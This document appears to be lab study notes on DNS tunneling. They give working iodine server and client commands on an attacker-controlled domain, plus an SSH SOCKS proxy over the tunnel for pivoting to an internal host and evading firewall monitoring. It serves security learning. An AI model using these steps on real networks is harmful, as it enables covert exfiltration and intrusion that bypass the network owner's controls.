DNS Tunneling abuses the **DNS protocol** to secretly carry other network traffic (e.g., HTTP, SSH) by **encapsulating data inside DNS queries and responses**.

Because DNS is often **allowed and poorly monitored**, it can be used to bypass network restrictions.

---

## Key Terms

- **DNS Data Exfiltration** – Sending data out by hiding it in DNS queries
    
- **DNS Tunneling / TCP over DNS** – Continuous two-way communication over DNS
    
- **iodine / iodined** – Tool used to create DNS tunnels
    

---

## Why DNS Tunneling Works

- DNS traffic is usually allowed through firewalls
    
- Security devices focus less on DNS payload content
    
- DNS queries can carry encoded data (labels, subdomains)
    

---

## Tool Used: iodine

- **iodined** → Server (Attacker)
    
- **iodine** → Client (Victim / JumpBox)
    
- Creates a **virtual network interface (dns0)**
    
- All traffic on this interface travels **inside DNS**
    

---

## DNS Tunnel Setup Flow

`Victim (JumpBox)    ↓ DNS Queries (encoded data)    ↓ Attacker DNS Server    ↓ Virtual Network (dns0)`

---

## Step-by-Step Process

### 1. Prepare DNS

- Control a domain (e.g., `att.tunnel.com`)
    
- Point its **NS record** to the Attacker machine
    

---

### 2. Start DNS Tunnel Server (Attacker)

`sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com`

**Result:**

- Creates `dns0` interface
    
- Attacker IP → `10.1.1.1`
    
- Client IP → `10.1.1.2`
    

---

### 3. Connect Client (JumpBox)

`sudo iodine -P thmpass att.tunnel.com`

**Result:**

- DNS tunnel established
    
- All traffic on `10.1.1.0/24` goes over DNS
    

---

## SSH Over DNS (Create Proxy)

`ssh thm@10.1.1.2 -4 -f -N -D 1080`

### Explanation

- `-D 1080` → SOCKS proxy
    
- `-f -N` → Background, no shell
    
- SSH traffic now flows **inside DNS**
    

---

## Using the DNS Tunnel Proxy

### With ProxyChains

`proxychains curl http://192.168.0.100/demo.php`

### With curl (SOCKS5)

`curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php`

---

## Traffic Confirmation

- Run `tcpdump` on attacker
    
- Only **DNS packets** appear
    
- No visible HTTP or SSH traffic
    

---

## Key Takeaways

- DNS tunneling creates a **covert communication channel**
    
- SSH over DNS enables **pivoting into internal networks**
    
- All data is **encapsulated inside DNS packets**
    
- Highly useful but **detectable by DNS analysis**